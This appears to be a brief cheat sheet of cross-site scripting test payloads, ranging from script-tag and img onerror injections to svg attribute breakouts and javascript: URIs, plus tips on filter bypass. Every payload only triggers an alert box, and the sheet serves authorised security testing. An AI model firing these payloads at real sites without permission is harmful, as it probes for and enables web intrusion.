# Basic XSS Payloads Cheat Sheet

A list of simple XSS payloads to test for Cross-Site Scripting vulnerabilities.  
**Use responsibly and only on systems you have permission to test.**

---

## 1. Basic Script Injection

```html
<script>alert(1)</script>
```

---

## 2. HTML Injection

```html
<img src=x onerror=alert(1)>
```

---

## 3. Attribute Injection

```html
"><svg/onload=alert(1)>
```

---

## 4. Input Field/Parameter

```html
"><script>alert(document.domain)</script>
```

---

## 5. Event Handler Injection

```html
<a href="#" onclick="alert('XSS')">Click me</a>
```

---

## 6. JavaScript URI

```html
javascript:alert(1)
```
*(Try in input fields that reflect links or URLs)*

---

## 7. Minimal Payloads

```html
"><img src=x onerror=alert(1)>
```

---

## Tips

- Try payloads in different contexts (URL, form fields, cookies, headers).
- Use developer tools to inspect reflected input and script execution.
- Bypass filters by encoding or using alternative event handlers (e.g., `onmouseover`, `onfocus`).

---

-